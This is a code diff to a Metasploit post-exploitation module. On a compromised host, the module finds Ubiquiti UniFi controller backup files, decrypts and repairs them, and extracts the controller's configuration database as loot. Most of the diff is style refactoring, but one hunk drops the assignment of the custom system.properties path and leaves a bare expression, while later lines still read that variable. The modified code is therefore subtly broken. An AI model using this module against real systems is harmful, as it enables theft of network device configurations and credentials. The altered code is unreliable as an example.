@@ -37,7 +37,12 @@ class MetasploitModule < Msf::Post
           ['URL', 'https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1'],
           ['URL', 'https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation'],
           ['URL', 'https://community.ubnt.com/t5/UniFi-Wireless/unf-controller-backup-file-format/td-p/1624105']
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
@@ -47,61 +52,70 @@ class MetasploitModule < Msf::Post
     ])
   end
 
-  def find_save_files(d)
+  def find_save_files(directory)
     case session.platform
     when 'windows'
-      files = session.fs.dir.foreach(d)
+      files = session.fs.dir.foreach(directory)
     else
       # when 'linux', 'osx', 'unifi'
       # osx will have a space in it by default, so we wrap the directory in quotes
-      files = cmd_exec("ls '#{d}'").split(/\r\n|\r|\n/)
+      files = cmd_exec("ls '#{directory}'").split(/\r\n|\r|\n/)
     end
+
     files.each do |file|
-      full = "#{d}/#{file}"
+      full = "#{directory}/#{file}"
       if directory?(full) && !['.', '..'].include?(file)
         find_save_files(full)
         next
       end
 
-      unless file.end_with? '.unf'
-        next
-      end
+      next unless file.end_with?('.unf')
 
       f = read_file(full)
       if f.nil?
         print_error("#{full} read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!")
         next
       end
-      loot_path = store_loot('ubiquiti.unifi.backup', 'application/zip', session,
-                             f, file, 'Ubiquiti Unifi Controller Encrypted Backup Zip')
+
+      loot_path = store_loot(
+        'ubiquiti.unifi.backup', 'application/zip', session,
+        f, file, 'Ubiquiti Unifi Controller Encrypted Backup Zip'
+      )
       print_good("File #{full} saved to #{loot_path}")
       decrypted_data = decrypt_unf(f)
       if decrypted_data.nil? || decrypted_data.empty?
         print_error("Unable to decrypt #{loot_path}")
         next
       end
-      loot_path = store_loot('ubiquiti.unifi.backup_decrypted', 'application/zip', session,
-                             decrypted_data, "#{file}.broken.zip", 'Ubiquiti Unifi Controller Decrypted Broken Backup Zip')
+      loot_path = store_loot(
+        'ubiquiti.unifi.backup_decrypted', 'application/zip', session,
+        decrypted_data, "#{file}.broken.zip", 'Ubiquiti Unifi Controller Decrypted Broken Backup Zip'
+      )
       print_good("File #{file} DECRYPTED and saved to #{loot_path}.  File needs to be repair via `zip -FF`")
+
       # ruby zip can't repair, we can try on command line but its not likely to succeed on all platforms
       # tested on kali
       repaired = repair_zip(loot_path)
       if repaired.nil?
-        fail_with Failure::Unknown, "Repair failed on #{loot_path.path}"
+        fail_with(Failure::Unknown, "Repair failed on #{loot_path.path}")
       end
-      loot_path = store_loot('ubiquiti.unifi.backup_decrypted_repaired', 'application/zip', session,
-                             repaired, "#{file}.zip", 'Ubiquiti Unifi Controller Backup Zip')
+
+      loot_path = store_loot(
+        'ubiquiti.unifi.backup_decrypted_repaired', 'application/zip', session,
+        repaired, "#{file}.zip", 'Ubiquiti Unifi Controller Backup Zip'
+      )
       print_good("File #{full} DECRYPTED and REPAIRED and saved to #{loot_path}.")
       config_db = extract_and_process_db(loot_path)
       if config_db.nil?
-        fail_with Failure::Unknown, 'Unable to locate db.gz config database file'
+        fail_with(Failure::Unknown, 'Unable to locate db.gz config database file')
       end
       print_status('Converting BSON to JSON.')
       unifi_config_db_json = bson_to_json(config_db)
 
       if unifi_config_db_json == {}
-        fail_with Failure::Unknown, 'Error in file conversion from BSON to JSON.'
+        fail_with(Failure::Unknown, 'Error in file conversion from BSON to JSON.')
       end
+
       unifi_config_eater(session.session_host, session.session_port, unifi_config_db_json)
     end
   end
@@ -140,7 +154,7 @@ class MetasploitModule < Msf::Post
 
     # read system.properties
     if datastore['SYSTEMFILE']
-      sprop = datastore['SYSTEMFILE']
+      datastore['SYSTEMFILE']
       vprint_status("Utilizing custom system.properties file location: #{datastore['SYSTEMFILE']}")
     end
 
@@ -154,7 +168,7 @@ class MetasploitModule < Msf::Post
         loot_path = store_loot('ubiquiti.system.properties', 'text/plain', session, data, sprop)
         vprint_status("File #{sprop} saved to #{loot_path}")
         print_good("Read UniFi Controller file #{sprop}")
-      rescue Rex::Post::Meterpreter::RequestError => e
+      rescue Rex::Post::Meterpreter::RequestError
         print_error("Failed to read #{sprop}")
         data = ''
       end
